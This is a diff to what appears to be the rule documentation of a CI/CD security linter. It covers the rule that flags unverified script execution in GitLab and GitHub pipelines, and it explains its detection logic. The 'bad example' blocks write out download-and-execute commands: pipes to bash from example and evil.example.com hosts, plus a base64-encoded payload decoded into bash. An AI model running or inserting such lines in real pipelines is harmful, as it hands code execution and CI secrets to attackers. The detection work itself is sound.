@@ -1779,56 +1779,164 @@ github:
       controlConfigKey: "pipelineMustNotExecuteUnverifiedScripts",
       productScope: "cli",
       description:
-        "A CI/CD job downloads and immediately executes a script from the internet without verifying its integrity. Patterns like `curl | bash`, `wget | sh`, or download-then-execute sequences are a well-documented supply chain attack vector.",
+        "A CI/CD job downloads or inline-executes code without any integrity check. Detects classic supply-chain patterns (`curl | bash`, `wget | sh`, download-then-exec on the same line, redirect-then-exec) plus the Megalodon-style obfuscated payload (`echo \"<base64>\" | base64 -d | bash`) and any generic `<cmd> | <shell>` chain. Maps to OWASP CICD-SEC-3 (Dependency Chain Abuse) and CICD-SEC-8 (Ungoverned Usage of 3rd Party Services).",
       impact:
-        "An attacker who compromises the remote URL can serve a modified script that exfiltrates CI/CD secrets (`$CI_JOB_TOKEN`, deploy keys, custom variables), modifies source code, or injects backdoors into build artifacts. Maps to OWASP CICD-SEC-3 (Dependency Chain Abuse) and CICD-SEC-8 (Ungoverned Usage of 3rd Party Services).",
+        "An attacker who compromises the remote URL — or who can inject an obfuscated inline payload into the pipeline — runs arbitrary code with the runner's `$CI_JOB_TOKEN`, deploy keys, custom CI/CD variables and any masked secrets in scope. The blast radius is the union of every secret the job can read; a single retag of the upstream script enough to exfiltrate the lot.",
       remediation:
-        "Download the script to a file first, verify its checksum against a known-good value, then execute it. Alternatively, vendor the script into your repository or use a trusted package manager.",
-      badExample: `# .gitlab-ci.yml — ❌ Download and execute without verification
-setup:
+        "Download to a file and verify a checksum or signature on the same line before execution (`sha256sum -c`, `gpg --verify`, `cosign verify` / `verify-blob`). Or vendor the script in-tree under version control. For trusted internal hosts, declare the URL pattern in `trustedUrls` (host-precise glob match).",
+      badExample: `# .gitlab-ci.yml — ❌ Six patterns the rule catches
+pipe_to_shell:
+  image: alpine:3.19
   script:
     - curl -sSL https://example.com/install.sh | bash
 
-tools:
+wget_pipe:
+  image: alpine:3.19
   script:
-    - wget -qO- https://get.example.com | sh
+    - wget -qO- https://example.com/install.sh | sh
 
-deploy:
+download_and_exec:
+  image: alpine:3.19
   script:
-    - curl -o deploy.sh https://example.com/deploy.sh
-    - bash deploy.sh`,
-      badExampleCaption: "Scripts are downloaded and executed without any integrity check.",
-      goodExample: `# .gitlab-ci.yml — ✅ Verify integrity before execution
-setup:
-  script:
-    - curl -sSL -o install.sh https://example.com/install.sh
-    - echo "a]3f8...expected_sha256  install.sh" | sha256sum -c -
-    - bash install.sh
+    - curl -fsSL https://example.com/install.sh -o install.sh && bash install.sh
 
-tools:
+redirect_then_exec:
+  image: alpine:3.19
   script:
-    # Vendored script committed to the repo
+    - curl -fsSL https://example.com/payload.sh > install.sh; sh install.sh
+
+megalodon_base64:
+  image: alpine:3.19
+  script:
+    - echo "Q0I9Imh0dHA6Ly8yMTYuMTI2LjIyNS4xMjk6ODQ0MyI=" | base64 -d | bash
+
+generic_local_pipe:
+  image: alpine:3.19
+  script:
+    - cat /tmp/payload.sh | sh`,
+      badExampleCaption: "Each pattern downloads or inline-decodes code and runs it on the same line — the rule operates per-script-line, so the unsafe download and the shell must both be on one line for a finding to fire.",
+      goodExample: `# .gitlab-ci.yml — ✅ Three ways to clear the finding
+vendored_script:
+  image: alpine:3.19
+  script:
+    # In-tree script under version control, reviewed in MRs.
     - bash scripts/setup-tools.sh
 
-deploy:
+checksum_verified:
+  image: alpine:3.19
   script:
-    - curl -o deploy.sh https://example.com/deploy.sh
-    - gpg --verify deploy.sh.sig deploy.sh
-    - bash deploy.sh
+    # sha256sum on the same line as the download exempts the line.
+    - curl -sSL https://example.com/install.sh -o install.sh && sha256sum -c install.sha256 && bash install.sh
 
-# .plumber.yaml
-# pipelineMustNotExecuteUnverifiedScripts:
-#   enabled: true
-#   trustedUrls:
-#     - https://internal-artifacts.example.com/*`,
-      goodExampleCaption: "Scripts are verified with checksums or GPG signatures before execution.",
+signature_verified:
+  image: alpine:3.19
+  script:
+    # cosign verify-blob on the same line works the same way; gpg --verify too.
+    - curl -sSL https://example.com/install.sh -o install.sh && cosign verify-blob --signature install.sig install.sh && bash install.sh
+
+# .plumber.yaml — exempt a known-good internal host
+# gitlab:
+#   controls:
+#     pipelineMustNotExecuteUnverifiedScripts:
+#       enabled: true
+#       trustedUrls:
+#         - https://internal-artifacts.example.com/*`,
+      goodExampleCaption: "Vendor in-tree, verify with sha256sum / gpg --verify / cosign verify on the same line as the download, or whitelist the host via trustedUrls.",
       tips: [
-        "Lines that include checksum verification (e.g., `sha256sum`, `gpg --verify`) between download and execution are automatically excluded.",
-        "Add trusted URL patterns to `trustedUrls` (supports wildcards) to suppress findings for known-good internal sources.",
-        "Consider vendoring external scripts into your repository for full control over their content.",
-        "Use a trusted package manager (apt, brew, pip) instead of raw script downloads when possible.",
+        "Recognised integrity checks (any on the same line as the download): `sha256sum`, `sha512sum`, `sha1sum`, `shasum`, `gpg --verify`, `cosign verify`, `cosign verify-blob`.",
+        "Verification is per-line: the keyword must be on the same line as the unsafe pattern, not on a separate `script:` entry. `curl … && sha256sum -c … && bash …` works; splitting them across three array items does not.",
+        "The verification check itself ignores keywords inside quoted strings — `echo \"should sha256sum first\" && curl evil | bash` does NOT bypass detection.",
+        "Pipe-to-shell substrings inside a quoted string (`echo \"Install with curl … | bash\"`) are documentation, not execution — they do not fire.",
+        "Heredoc-to-shell with no download on the line (`cat <<EOF | bash`) is operator-authored, in-tree content. Any unsafe download inside the heredoc body still fires on its own script line.",
+        "`trustedUrls` is host-precise: `https://example.com/*` does NOT match `https://evil.example.com/*`.",
+        "Consider vendoring external scripts into your repository for full control over their content; use a trusted package manager (apt, brew, pip) instead of raw script downloads when possible.",
       ],
       relatedCodes: ["ISSUE-401", "ISSUE-204"],
+    },
+    github: {
+      title: "Unverified script execution",
+      category: "Pipeline Composition",
+      severity: "high",
+      fixDuration: "medium",
+      controlName: "Pipeline must not execute unverified scripts",
+      controlConfigKey: "pipelineMustNotExecuteUnverifiedScripts",
+      productScope: "cli",
+      description:
+        "A workflow `run:` step downloads or inline-executes code without any integrity check. Detects classic supply-chain patterns (`curl | bash`, download-then-exec, redirect-then-exec) plus the Megalodon-style obfuscated payload (`echo \"<base64>\" | base64 -d | bash`) used in the October 2025 mass-backdooring campaign reported by SafeDep. Maps to OWASP CICD-SEC-3 (Dependency Chain Abuse) and CICD-SEC-8 (Ungoverned Usage of 3rd Party Services).",
+      impact:
+        "An attacker who compromises the remote URL — or who can inject an obfuscated inline payload into a workflow — runs arbitrary code with the job's `GITHUB_TOKEN`, every secret the workflow can read, OIDC trust relationships, deploy keys, package-registry credentials. The Megalodon vector specifically targets GitHub Actions because the privileged context is uniform across thousands of repos.",
+      remediation:
+        "Vendor scripts into the repository, or download to a file and verify a checksum / signature on the same line before execution. For trusted internal hosts, declare the URL pattern in `trustedUrls` (host-precise glob match). Heredoc-to-shell with no download on the line is treated as in-tree operator-authored content and does not fire.",
+      badExample: `# .github/workflows/setup.yml — ❌ Five patterns this rule catches
+jobs:
+  pipe_to_shell:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -sSL https://example.com/install.sh | bash
+
+  download_and_exec:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsSL https://example.com/install.sh -o install.sh && bash install.sh
+
+  redirect_then_exec:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsSL https://example.com/payload.sh > install.sh; sh install.sh
+
+  megalodon_base64:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Q0I9Imh0dHA6Ly8yMTYuMTI2LjIyNS4xMjk6ODQ0MyI=" | base64 -d | bash
+
+  heredoc_camouflage:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl https://evil.example.com/payload | bash <<EOF
+          EOF`,
+      badExampleCaption: "Each pattern downloads or inline-decodes code and runs it without any integrity check — exactly the attack surface Megalodon exploited.",
+      goodExample: `# .github/workflows/setup.yml — ✅ Three ways to clear the finding
+jobs:
+  vendored_script:
+    runs-on: ubuntu-latest
+    steps:
+      # In-tree script under version control, reviewed in PRs.
+      - run: bash scripts/setup-tools.sh
+
+  checksum_verified:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -sSL https://example.com/install.sh -o install.sh
+          echo "<expected-sha256>  install.sh" | sha256sum -c -
+          bash install.sh
+
+  signature_verified:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -sSL https://example.com/install.sh -o install.sh
+          cosign verify-blob --signature install.sig install.sh
+          bash install.sh
+
+# .plumber.yaml — exempt a known-good internal host
+# github:
+#   controls:
+#     pipelineMustNotExecuteUnverifiedScripts:
+#       enabled: true
+#       trustedUrls:
+#         - https://internal-artifacts.example.com/*`,
+      goodExampleCaption: "Vendor in-tree, verify with sha256sum / gpg --verify / cosign verify on the same line, or whitelist the host via trustedUrls.",
+      tips: [
+        "Recognised integrity checks (any on the same line as the download): `sha256sum`, `sha512sum`, `sha1sum`, `shasum`, `gpg --verify`, `cosign verify`, `cosign verify-blob`.",
+        "The verification check ignores keywords inside quoted strings, so `echo \"should sha256sum first\" && curl evil | bash` does NOT bypass detection.",
+        "`trustedUrls` is host-precise: `https://example.com/*` does NOT match `https://evil.example.com/*`.",
+        "Pipe-to-shell substrings inside a quoted string (`echo \"Install with curl … | bash\"`) are documentation, not execution — they do not fire.",
+        "Heredoc-to-shell with no download on the line (`cat <<EOF | bash`) is operator-authored, in-tree content. Any unsafe download inside the heredoc body still fires on its own script line.",
+        "Inline payloads on `pull_request_target` workflows are especially dangerous — combine ISSUE-411 with ISSUE-802 (dangerous-triggers) for the full Megalodon defence.",
+      ],
+      relatedCodes: ["ISSUE-207", "ISSUE-802", "ISSUE-703"],
     },
   },
 
